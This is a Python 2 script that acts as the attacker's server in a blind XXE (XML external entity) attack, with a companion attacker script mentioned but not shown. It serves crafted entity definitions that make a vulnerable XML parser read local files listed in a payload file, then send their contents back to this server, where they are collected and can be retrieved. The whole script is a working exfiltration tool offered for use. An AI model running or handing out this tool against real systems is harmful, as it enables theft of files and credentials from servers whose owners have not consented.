#!/usr/bin/env python
# -*- coding: utf-8 -*-

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import sys, getopt

with open("linuxPayloads.txt") as f:
    content = f.readlines()

payloads = [x.strip() for x in content]
directories = []
for pay in payloads:
    if pay.endswith("/"):
        directories.append(pay)

# Establish a basis for our attack string
stub1 = '<!ENTITY % entity SYSTEM "file://'
stub2 = '">\n'
responder = """<!ENTITY % content "<!ENTITY xxeEntity SYSTEM '"""
stub3 = ""
counter = 0
results = ""
hostURL = ""
port = 8080

class S(BaseHTTPRequestHandler):
    # Our server that handles web server requests instantiated by BlindRef_Attacker.py
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        global counter, results, hostURL, port
        self._set_headers()
        if self.path == "/ev.xml":
            if counter < len(payloads):
                print "\n\n\nRequesting: " + payloads[counter]
                results += "\n\nRequesting contents of: " + payloads[counter] + "\n\n"

                # Writes the requested file attack string as our response
                # The requesting web server then includes the content of our entity within a web request
                self.wfile.write(stub1 + payloads[counter] + stub2 + responder + stub3)
                counter += 1
        elif self.path == "/getInfo":
            self.wfile.write(len(payloads))
        elif self.path == "/getFinalDetails":
            self.wfile.write(results)
        elif self.path == "/reset":
            results = ""
        else:
            results += self.path

    def do_HEAD(self):
        self._set_headers()

def run(server_class=HTTPServer, handler_class=S, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print 'Starting server on port ' + str(port) + '...'
    httpd.serve_forever()

def help():
    # Prints out the help function, which guides users how to use the script.
    print 'BlindRef_Server.py -s serverURL -p serverPort (ex: python BlindRef_Server.py -s http://172.16.208.1 -p 8080)'

def main(argv):
    global hostURL, port, stub3

    try:
        opts, args = getopt.getopt(argv,"hs:p:",["server=","port="])
    except getopt.GetoptError:
        help()
        sys.exit()

    for opt, arg in opts:
        if opt == '-h':
            help()
            sys.exit()
        elif opt in ("-s", "--server"):
            hostURL = arg
        elif opt in ("-p", "--port"):
            port = arg

    stub3 = "" + str(hostURL) + ":" + str(port) + """/?%entity;'>">"""
    run(port=int(port))

if __name__ == "__main__":
    main(sys.argv[1:])